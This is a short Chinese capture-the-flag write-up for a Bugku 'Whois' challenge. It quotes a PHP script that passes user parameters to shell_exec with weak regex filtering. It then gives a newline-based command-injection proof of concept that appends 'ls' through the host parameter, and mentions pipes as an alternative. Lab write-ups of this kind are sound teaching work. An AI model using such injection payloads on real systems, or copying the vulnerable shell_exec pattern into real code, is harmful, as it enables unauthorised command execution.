# Bugku中Whois的记录

> 本题主要考察linux中的命令截断

## 1. 查看源码
在网页源码中发现query.php，访问可以发现如下源码：
```php
<?php

error_reporting(0);

$output = null;
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";


if (isset($_GET['query']) && isset($_GET['host']) && 
      is_string($_GET['query']) && is_string($_GET['host'])) {

  $query = $_GET['query'];
  $host = $_GET['host'];
  
  if ( !preg_match($host_regex, $host) || !preg_match($query_regex, $query) ) {
    $output = "Invalid query or whois host";
  } else {
    $output = shell_exec("/usr/bin/whois -h ${host} ${query}");
  }

} 
else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Whois</title>
  </head>
  <body>
    <pre><?= htmlspecialchars($output) ?></pre>
  </body>
</html>

```

## 2. PoC构造
从上面的源码中可以发现，可以通过构造host和query参数来实现命令执行的效果。问题的关键在于whois命令的截断，这里可以考虑使用换行。
因此可以构造如下PoC:
***/query.php?host=whois.verisign-grs.com%0a&query=ls***

## 3. 思考
- 其他的命令截断方案
  - 可以考虑使用管道
